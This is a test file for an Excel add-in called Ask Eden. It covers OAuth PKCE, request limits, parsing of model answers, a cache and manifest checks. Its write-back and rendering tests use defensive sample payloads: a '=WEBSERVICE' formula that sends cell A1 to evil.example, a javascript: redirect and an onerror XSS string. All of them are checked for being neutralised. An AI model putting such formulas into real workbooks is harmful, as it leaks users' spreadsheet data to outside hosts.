// Ask Eden for Excel's own files (public/addins/excel/): the pure helpers in lib.js (PKCE, request
// bodies within the server's limits, reading answers, what may be written back, the cell function's
// cache), the =EDEN.ASK cell function (functions.js) against a fake server, and the files themselves:
// the manifest well-formed with the right addresses, every referenced file there, no inline scripts.
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { test } from 'node:test';
import vm from 'node:vm';
import { challengeOf as serverChallenge } from '../src/accounts/scoped.js';
import { parseSheet, SHEET } from '../src/eden/sheets.js';

const DIR = join(dirname(fileURLToPath(import.meta.url)), '..', 'public', 'addins', 'excel');
const read = (name) => readFileSync(join(DIR, name), 'utf8');

// A storage like localStorage.
class Store {
  constructor() {
    this.map = new Map();
  }
  getItem(k) {
    return this.map.has(k) ? this.map.get(k) : null;
  }
  setItem(k, v) {
    this.map.set(k, String(v));
  }
  removeItem(k) {
    this.map.delete(k);
  }
}
const storage = new Store();
Object.defineProperty(globalThis, 'localStorage', { value: storage, configurable: true, writable: true });
vm.runInThisContext(read('lib.js'), { filename: 'lib.js' });
const X = globalThis.EdenExcel;

test('PKCE: a verifier the server takes, and the same S256 challenge the server computes', async () => {
  const verifier = X.randomCode(48);
  assert.match(verifier, /^[A-Za-z0-9._~-]{43,128}$/);
  assert.equal(X.randomCode().length, 43);
  assert.notEqual(X.randomCode(), X.randomCode());
  const challenge = await X.challengeOf(verifier);
  assert.match(challenge, /^[A-Za-z0-9_-]{43}$/);
  assert.equal(challenge, await serverChallenge(verifier));
});

test('connect: the consent address, the return check, the token body', () => {
  const url = new URL(X.connectUrl({ origin: 'https://askeden.com', state: 'state-12345', challenge: 'c'.repeat(43) }));
  assert.equal(url.origin + url.pathname, 'https://askeden.com/eden/connect');
  assert.equal(url.searchParams.get('client_id'), 'excel');
  assert.equal(url.searchParams.get('redirect_uri'), 'https://askeden.com/addins/excel/connected');
  assert.equal(url.searchParams.get('code_challenge_method'), 'S256');
  // A preview Worker's pane comes back to itself.
  assert.equal(X.redirectFor('https://eden-preview.example.workers.dev'), 'https://eden-preview.example.workers.dev/addins/excel/connected');
  assert.equal(X.redirectFor('javascript:alert(1)'), 'https://askeden.com/addins/excel/connected');

  const back = 'https://askeden.com/addins/excel/connected';
  assert.deepEqual(X.readRedirect(`${back}?code=acc.secret&state=s1234567`, 's1234567'), { code: 'acc.secret' });
  assert.deepEqual(X.readRedirect(`${back}?code=acc.secret&state=other123`, 's1234567'), { error: 'bad_state' });
  assert.deepEqual(X.readRedirect(`${back}?error=access_denied&state=s1234567`, 's1234567'), { error: 'access_denied' });
  assert.deepEqual(X.readRedirect(`${back}?state=s1234567`, 's1234567'), { error: 'no_code' });
  assert.deepEqual(X.readRedirect('https://askeden.com/elsewhere?code=a.b&state=s1234567', 's1234567'), { error: 'bad_redirect' });
  assert.deepEqual(X.readRedirect('not a url', 's1234567'), { error: 'bad_redirect' });
  assert.deepEqual(X.readRedirect(`${back}?code=a.b&state=`, ''), { error: 'bad_state' });

  assert.deepEqual(X.tokenBody({ code: 'a.b', verifier: 'v', origin: 'https://askeden.com' }), { grant_type: 'authorization_code', code: 'a.b', code_verifier: 'v', client_id: 'excel', redirect_uri: back });
});

test('the token: saved with its expiry, read back, forgotten', () => {
  const s = new Store();
  assert.equal(X.saveToken(s, { access_token: 'nope' }), false);
  assert.equal(X.saveToken(s, { access_token: 'es1.a.b.c', expires_in: 60 }, 1000), true);
  assert.equal(X.readToken(s, 2000), 'es1.a.b.c');
  assert.equal(X.readToken(s, 1000 + 61_000), null);
  X.forgetToken(s);
  assert.equal(X.readToken(s), null);
  s.setItem(X.TOKEN_KEY, '{broken');
  assert.equal(X.readToken(s), null);
});

test('cells as sent: dates as shown, empties as null, long text capped', () => {
  assert.equal(X.cellOf(45291, '12/31/2023'), '12/31/2023');
  assert.equal(X.cellOf(0.5, '12:00 PM'), '12:00 PM');
  assert.equal(X.cellOf(1234.5, '$1,234.50'), 1234.5);
  assert.equal(X.cellOf(0.25, '25%'), 0.25);
  assert.equal(X.cellOf(12, '########'), 12);
  assert.equal(X.cellOf('', ''), null);
  assert.equal(X.cellOf(true), true);
  assert.equal(X.cellOf('x'.repeat(3000)).length, 2000);
  assert.deepEqual(X.gridOf([[1, 'a'], ['', 45291]], [['1', 'a'], ['', '1/1/2024']]), [[1, 'a'], [null, '1/1/2024']]);
  assert.deepEqual(X.formulaGrid([['=A1+1', 3], ['x', '=SUM(A:A)']]), [['=A1+1', ''], ['', '=SUM(A:A)']]);
  assert.equal(X.formulaGrid([[1, 'x']]), null);
});

test('limits: too many cells or rows is refused before anything is read or sent', () => {
  assert.equal(X.sizeProblem('analyze', 100, 50), null);
  assert.match(X.sizeProblem('analyze', 1048576, 1), /1,048,576 cells.*at most 5,000/);
  assert.match(X.sizeProblem('fill', 1001, 1), /at most 1,000 rows/);
  assert.equal(X.sizeProblem('ask', 1001, 1), null);
  const fit = X.fitRows(Array.from({ length: 3000 }, () => ['a', 'b']));
  assert.equal(fit.rows, 2500);
  assert.equal(fit.trimmed, true);
});

test('request bodies: within the server’s limits, and the server takes them', () => {
  const values = [['City', 'Sales'], ['paris ', 3], ['Lyon', null]];
  const cases = [
    { action: 'ask', instruction: 'Which city sold most?', sheet: { name: 'Sales', range: 'A1:B3', values } },
    { action: 'analyze', sheet: { name: 'Sales', range: 'A1:B3', values } },
    { action: 'formula', instruction: 'total sales', sheet: { name: 'Sales', range: 'A1:B3', values }, active: { address: 'B4' } },
    { action: 'explain', active: { address: 'B4', formula: '=SUM(B2:B3)', value: '3' } },
    { action: 'fill', instruction: 'country', sheet: { range: 'A1:A3', values: [['Paris'], ['Lyon'], ['Rome']] } },
    { action: 'clean', sheet: { range: 'A1:B3', values, formulas: [['', ''], ['', '=1+2'], ['', '']] } },
    { action: 'table', instruction: 'a 3-day plan', active: { address: 'D2' } },
    { action: 'cell', instruction: 'Sum it', sheet: { values: [[1], [2]] } },
  ];
  for (const c of cases) {
    const { body, error } = X.sheetBody(c);
    assert.equal(error, undefined, c.action);
    assert.equal(body.app, 'excel');
    assert.equal(parseSheet(body).action, c.action, `server takes ${c.action}`);
  }
  assert.match(X.sheetBody({ action: 'formula' }).error, /Type what you want/);
  assert.match(X.sheetBody({ action: 'fill', sheet: { values: [['a']] } }).error, /each row/);
  assert.match(X.sheetBody({ action: 'analyze', sheet: { values: [[null, '']] } }).error, /Select some cells/);
  assert.match(X.sheetBody({ action: 'explain', active: { address: 'A1', value: '3' } }).error, /formula first/);
  assert.match(X.sheetBody({ action: 'ask', instruction: 'x', sheet: { values: [Array(5001).fill(1)] } }).error, /5,000 cells/);
  assert.match(X.sheetBody({ action: 'ask', instruction: 'x', sheet: { values: Array.from({ length: 40 }, () => ['y'.repeat(1999)]) } }).error, /too much text/);
  assert.match(X.sheetBody({ action: 'clean', sheet: { values: Array.from({ length: 1001 }, () => ['x']) } }).error, /1,000 rows/);
  // The instruction is cut to the server's limit; history keeps the last 20 turns, starting with the person's.
  const long = X.sheetBody({ action: 'ask', instruction: 'q'.repeat(2500), history: Array.from({ length: 25 }, (_, i) => ({ role: i % 2 ? 'eden' : 'user', text: `t${i}` })) }).body;
  assert.equal(long.instruction.length, SHEET.instructionChars);
  assert.ok(long.history.length <= SHEET.history);
  assert.equal(long.history[0].role, 'user');
  assert.equal(parseSheet(long).history.length, long.history.length);
});

test('reading answers: one formula, one line per row, a same-shape clean, a table', () => {
  assert.equal(X.formulaOf('=SUM(B2:B9)'), '=SUM(B2:B9)');
  assert.equal(X.formulaOf('```excel\n=XLOOKUP(A2,D:D,E:E)\n```'), '=XLOOKUP(A2,D:D,E:E)');
  assert.equal(X.formulaOf('Here you go:\n`=A1*2`'), '=A1*2');
  assert.equal(X.formulaOf('I can’t do that'), null);

  assert.deepEqual(X.fillCheck('France\nFrance\nItaly\n', 3), { lines: ['France', 'France', 'Italy'] });
  assert.deepEqual(X.fillCheck('France\n\nItaly', 3), { lines: ['France', '', 'Italy'] });
  assert.deepEqual(X.fillCheck('a\nb\n\n\n', 2), { lines: ['a', 'b'] });
  assert.match(X.fillCheck('France\nItaly', 3).error, /2 lines for 3 rows, so nothing was written/);
  assert.match(X.fillCheck('a\nb\nc\nd', 3).error, /4 lines for 3 rows/);

  assert.deepEqual(X.parseTsv('a\tb\r\nc\td\n'), [['a', 'b'], ['c', 'd']]);
  assert.deepEqual(X.parseTsv('| Day | Plan |\n|---|---|\n| Mon | Run |'), [['Day', 'Plan'], ['Mon', 'Run']]);

  const sent = [['City', 'Sales'], ['paris ', 3], ['LYON', null]];
  const ok = X.cleanCheck('City\tSales\nParis\t3\nLyon', sent); // a trailing empty cell may be dropped
  assert.deepEqual(ok.rows, [['City', 'Sales'], ['Paris', '3'], ['Lyon', '']]);
  assert.match(X.cleanCheck('City\tSales\nParis\t3', sent).error, /2 rows for 3/);
  assert.match(X.cleanCheck('City\tSales\nParis\t3\textra\nLyon\t', sent).error, /Row 2 came back with 3 cells/);
  assert.match(X.cleanCheck('City\tSales\nParis\nLyon\t', sent).error, /Row 2 came back with 1 cells instead of 2/);
  // Formula cells are never changed; unchanged cells aren't listed.
  const changes = X.cleanChanges(sent, ok.rows, [['', ''], ['', '=1+2'], ['', '']]);
  assert.deepEqual(changes, [{ r: 1, c: 0, from: 'paris ', to: 'Paris' }, { r: 2, c: 0, from: 'LYON', to: 'Lyon' }]);
  assert.deepEqual(X.cleanChanges([['Madrid ', 3]], [['Madrid', '3']]), [{ r: 0, c: 0, from: 'Madrid ', to: 'Madrid' }]);

  assert.deepEqual(X.tableCheck('Day\tPlan\nMon\tRun\tfast\n\n').rows, [['Day', 'Plan', ''], ['Mon', 'Run', 'fast']]);
  assert.match(X.tableCheck('').error, /didn’t send back a table/);
  assert.match(X.tableCheck(Array.from({ length: 3000 }, () => 'a\tb').join('\n')).error, /too big/);
});

test('writing back: model text never becomes a formula; plain numbers stay numbers', () => {
  assert.equal(X.safeCell('=WEBSERVICE("https://evil.example/?"&A1)'), '\'=WEBSERVICE("https://evil.example/?"&A1)');
  assert.equal(X.safeCell('+1 555 0100'), "'+1 555 0100");
  assert.equal(X.safeCell('@SUM(A1)'), "'@SUM(A1)");
  assert.equal(X.safeCell('-'), "'-");
  assert.equal(X.safeCell('-12.5'), -12.5);
  assert.equal(X.safeCell('42'), 42);
  assert.equal(X.safeCell('007'), '007');
  assert.equal(X.safeCell('France'), 'France');
  assert.deepEqual(X.splitAddress("'Q1 ''24'!B2:D9"), { sheet: "Q1 '24", cells: 'B2:D9' });
  assert.deepEqual(X.splitAddress('Sheet1!A1'), { sheet: 'Sheet1', cells: 'A1' });
  assert.equal(X.cellsOf('B2'), 'B2');
});

test('errors in plain words, with Connect or See your plan when they help', () => {
  assert.equal(X.errorWords(401, 'not_connected').connect, true);
  const plan = X.errorWords(402, 'no_allowance', 'No included AI is left this month.');
  assert.equal(plan.plan, true);
  assert.equal(plan.words, 'No included AI is left this month.');
  assert.match(X.errorWords(429, 'slow_down').words, /Wait a moment/);
  assert.match(X.errorWords(413, 'too_long', 'Select fewer cells (at most 5,000).').words, /5,000/);
  assert.match(X.errorWords(503, 'not_set_up').words, /isn’t ready/);
  assert.match(X.errorWords(0).words, /Can’t reach askeden\.com/);
  assert.match(X.errorWords(400, 'bad_request', 'Type what you want first.').words, /Type what you want/);
});

test('the cell cache: keyed by prompt + values, kept, capped, cleared', () => {
  const s = new Store();
  const k1 = X.cacheKey('Sum it', [[1], [2]]);
  assert.equal(k1, X.cacheKey('  Sum it ', [[1], [2]]));
  assert.notEqual(k1, X.cacheKey('Sum it', [[1], [3]]));
  assert.notEqual(k1, X.cacheKey('Sum it', null));
  assert.match(k1, /^eden-fx:[0-9a-f]{16}$/);
  X.cachePut(s, k1, '3', 1000);
  assert.equal(X.cacheGet(s, k1, 2000), '3');
  assert.equal(X.cacheGet(s, k1, 1000 + 31 * 864e5), null);
  for (let i = 0; i < 510; i++) X.cachePut(s, X.cacheKey(`q${i}`, null), String(i));
  assert.equal(X.cacheCount(s), 500);
  assert.equal(X.cacheClear(s), 500);
  assert.equal(X.cacheCount(s), 0);
  assert.equal(X.cellAnswer('Paris\nFrance'), 'Paris France');
});

test('light Markdown as blocks, never HTML', () => {
  assert.deepEqual(X.blocks('**Top:** Paris\n\n- one\n- `two`'), [
    { type: 'p', runs: [{ t: 'Top:', b: true }, { t: ' Paris' }] },
    { type: 'gap' },
    { type: 'li', runs: [{ t: 'one' }] },
    { type: 'li', runs: [{ t: 'two', code: true }] },
  ]);
  assert.equal(X.blocks('<img src=x onerror=alert(1)>')[0].runs[0].t, '<img src=x onerror=alert(1)>');
  assert.equal(X.wordsFor('fr-FR')('connect'), 'Connecter');
  assert.equal(X.wordsFor('de-DE')('connect'), 'Connect');
  assert.equal(X.wordsFor('en')('cellsCount', { n: 3, cap: 100 }), 'Cell answers this session: 3 of 100.');
  for (const key of Object.keys(X.STRINGS.en)) assert.ok(X.STRINGS.fr[key], `French for ${key}`);
});

test('=EDEN.ASK: asks once per prompt + values, at most 4 at a time, stops at the session cap', async () => {
  const calls = [];
  let open = 0;
  let most = 0;
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    calls.push({ url, body: JSON.parse(init.body), auth: init.headers.authorization });
    open += 1;
    most = Math.max(most, open);
    await new Promise((r) => setTimeout(r, 5));
    open -= 1;
    const body = JSON.parse(init.body);
    if (body.instruction === 'broke') return new Response(JSON.stringify({ error: 'No included AI is left on your Eden account.', code: 'no_allowance' }), { status: 402 });
    return new Response(`answer to ${body.instruction}\n`, { status: 200 });
  };
  try {
    storage.map.clear();
    vm.runInThisContext(read('functions.js'), { filename: 'functions.js' });
    const C = globalThis.EdenCells;
    await assert.rejects(C.ask('Sum it', [[1], [2]]), /Connect Ask Eden first/);
    assert.equal(calls.length, 0);
    assert.equal(C.takeNeedConnect(), 1);

    X.saveToken(undefined, { access_token: 'es1.acc.id.secret', expires_in: 3600 });
    assert.equal(await C.ask('Sum it', [[1], [2]]), 'answer to Sum it');
    assert.equal(calls[0].url, '/api/eden/sheet');
    assert.equal(calls[0].auth, 'Bearer es1.acc.id.secret');
    assert.deepEqual(calls[0].body, { action: 'cell', app: 'excel', instruction: 'Sum it', sheet: { values: [[1], [2]] } });
    assert.equal(parseSheet(calls[0].body).action, 'cell');
    assert.equal(await C.ask('Sum it', [[1], [2]]), 'answer to Sum it');
    assert.equal(calls.length, 1, 'a recalculation doesn’t ask again');
    assert.equal(await C.ask('Sum it', [['', '']]), 'answer to Sum it');
    assert.equal(calls[1].body.sheet, undefined, 'an empty range sends no cells');

    await Promise.all(Array.from({ length: 12 }, (_, i) => C.ask(`q${i}`)));
    assert.ok(most <= 4, `at most 4 at once (saw ${most})`);
    await assert.rejects(C.ask('broke'), /See your plan/);
    await assert.rejects(C.ask(''), /Type a question/);

    C.allowMore(0);
    await assert.rejects(C.ask('one more'), /paused after/);
    assert.equal(await C.ask('q3'), 'answer to q3', 'saved answers still come back at the cap');
    C.allowMore(5);
    assert.equal(await C.ask('one more'), 'answer to one more');
    assert.ok(C.clearSaved() >= 13);
  } finally {
    globalThis.fetch = realFetch;
    storage.map.clear();
  }
});

// ── the files ──

/** A small XML well-formedness check: tags nest, attributes are quoted, entities are known. */
function wellFormed(xml) {
  const body = xml.replace(/^﻿?<\?xml[^?]*\?>\s*/, '').replace(/<!--[\s\S]*?-->/g, '');
  const stack = [];
  let pos = 0;
  const tag = /<(\/?)([A-Za-z_][\w:.-]*)((?:\s+[A-Za-z_][\w:.-]*\s*=\s*(?:"[^"<]*"|'[^'<]*'))*)\s*(\/?)>/g;
  for (const m of body.matchAll(tag)) {
    const text = body.slice(pos, m.index);
    if (/[<>]/.test(text)) throw new Error(`stray markup before ${m[0]}`);
    if (/&(?!(amp|lt|gt|quot|apos|#\d+|#x[0-9a-f]+);)/i.test(text + m[3])) throw new Error(`bad entity near ${m[0]}`);
    if (m[1]) {
      if (stack.pop() !== m[2]) throw new Error(`mismatched </${m[2]}>`);
    } else if (!m[4]) stack.push(m[2]);
    pos = m.index + m[0].length;
  }
  if (/[<>]/.test(body.slice(pos))) throw new Error('stray markup at the end');
  if (stack.length) throw new Error(`unclosed <${stack.at(-1)}>`);
  return true;
}

test('the manifest: well-formed, shared runtime, EDEN namespace, every address on askeden.com and present', () => {
  const raw = read('manifest.xml');
  assert.ok(wellFormed(raw));
  const xml = raw.replace(/<!--[\s\S]*?-->/g, '');
  assert.throws(() => wellFormed('<a><b></a>'), /mismatched/);
  assert.match(xml, /<OfficeApp [^>]*xsi:type="TaskPaneApp"/);
  assert.match(xml, /xmlns="http:\/\/schemas\.microsoft\.com\/office\/appforoffice\/1\.1"/);
  assert.match(xml, /<Id>[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}<\/Id>/);
  assert.match(xml, /<ProviderName>Harrat Global Holdings, Inc\.<\/ProviderName>/);
  assert.match(xml, /<DisplayName DefaultValue="Ask Eden"/);
  assert.match(xml, /<Host Name="Workbook"\/>/);
  assert.match(xml, /<Set Name="SharedRuntime" MinVersion="1\.1"\/>/);
  assert.match(xml, /<Runtime resid="Taskpane\.Url" lifetime="long"\/>/);
  assert.match(xml, /<ExtensionPoint xsi:type="CustomFunctions">/);
  assert.match(xml, /<bt:String id="Functions\.Namespace" DefaultValue="EDEN"\/>/);
  assert.match(xml, /<OfficeTab id="TabHome">/);
  assert.match(xml, /<AppDomain>https:\/\/askeden\.com<\/AppDomain>/);
  assert.match(xml, /<SupportUrl DefaultValue="https:\/\/askeden\.com\/help"\/>/);
  assert.match(xml, /<SourceLocation DefaultValue="https:\/\/askeden\.com\/addins\/excel\/taskpane\.html"\/>/);
  // Every resid used is defined, and the order of OfficeApp's children is the schema's.
  const defined = new Set([...xml.matchAll(/<bt:(?:Image|Url|String) id="([^"]+)"/g)].map((m) => m[1]));
  for (const [, id] of xml.matchAll(/resid="([^"]+)"/g)) assert.ok(defined.has(id), `resid ${id} defined`);
  for (const id of defined) assert.ok(id.length <= 32, `resid ${id} at most 32 characters`);
  const order = ['Id', 'Version', 'ProviderName', 'DefaultLocale', 'DisplayName', 'Description', 'IconUrl', 'HighResolutionIconUrl', 'SupportUrl', 'AppDomains', 'Hosts', 'Requirements', 'DefaultSettings', 'Permissions', 'VersionOverrides'];
  const at = order.map((name) => xml.indexOf(`<${name}`));
  assert.ok(at.every((i, n) => i > 0 && (n === 0 || i > at[n - 1])), 'OfficeApp children in schema order');
  // Strings within the schema's lengths (short 125, long 250).
  for (const [, value] of xml.matchAll(/(?:DefaultValue|Value)="([^"]*)"/g)) assert.ok(value.replace(/&quot;/g, '"').length <= 250, value.slice(0, 40));
  const urls = [...xml.matchAll(/https:\/\/askeden\.com\/addins\/excel\/([^"<]+)/g)].map((m) => m[1]);
  assert.ok(urls.length >= 6);
  for (const name of urls) {
    assert.match(name, /^[a-z0-9-]+\.(html|js|css|json|xml|png|svg)$/, `${name} is a name addins.js serves`);
    assert.ok(existsSync(join(DIR, name)), `${name} exists`);
  }
  for (const [, url] of xml.matchAll(/"(https?:\/\/[^"]+)"/g)) if (!/^http:\/\/(schemas\.microsoft\.com|www\.w3\.org)\//.test(url)) assert.match(url, /^https:\/\/askeden\.com\//, url);
});

test('the functions metadata: ASK(prompt, [range])', () => {
  const meta = JSON.parse(read('functions.json'));
  const [fn] = meta.functions;
  assert.equal(meta.functions.length, 1);
  assert.equal(fn.id, 'ASK');
  assert.equal(fn.name, 'ASK');
  assert.equal(fn.result.type, 'string');
  assert.deepEqual(fn.parameters.map((p) => [p.name, p.optional === true]), [['prompt', false], ['range', true]]);
  assert.equal(fn.parameters[1].dimensionality, 'matrix');
  assert.match(read('functions.js'), /CustomFunctions\.associate\('ASK', ask\)/);
});

test('the pages: no inline scripts or handlers, every referenced file there, names addins.js serves', () => {
  const names = readdirSync(DIR);
  for (const name of names) if (name !== 'README.md') assert.match(name, /^[a-z0-9-]+\.(html|js|css|json|xml|png|svg)$/, name);
  for (const page of names.filter((n) => n.endsWith('.html'))) {
    const html = read(page);
    for (const [, attrs, inner] of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)) {
      assert.match(attrs, /\bsrc="/, `${page}: every script has a src`);
      assert.equal(inner.trim(), '', `${page}: no inline script`);
    }
    assert.doesNotMatch(html, /\son[a-z]+\s*=/i, `${page}: no inline event handlers`);
    assert.doesNotMatch(html, /javascript:/i, `${page}: no javascript: URLs`);
    for (const [, ref] of html.matchAll(/(?:src|href)="([^"]+)"/g)) {
      if (/^https:\/\/appsforoffice\.microsoft\.com\/lib\/1\/hosted\/office\.js$/.test(ref)) continue;
      if (/^https:\/\/askeden\.com\//.test(ref)) continue; // links out (plan, help)
      assert.ok(!/^[a-z]+:/i.test(ref), `${page}: ${ref} is local`);
      assert.ok(existsSync(join(DIR, ref)), `${page}: ${ref} exists`);
    }
  }
  assert.match(read('taskpane.html'), /<script src="functions\.js"><\/script>/, 'the cell function lives in the pane’s runtime');
  // The pane never writes model text as HTML.
  for (const js of ['taskpane.js', 'functions.js', 'connected.js', 'lib.js']) assert.doesNotMatch(read(js), /innerHTML|outerHTML|insertAdjacentHTML|document\.write/, js);
});
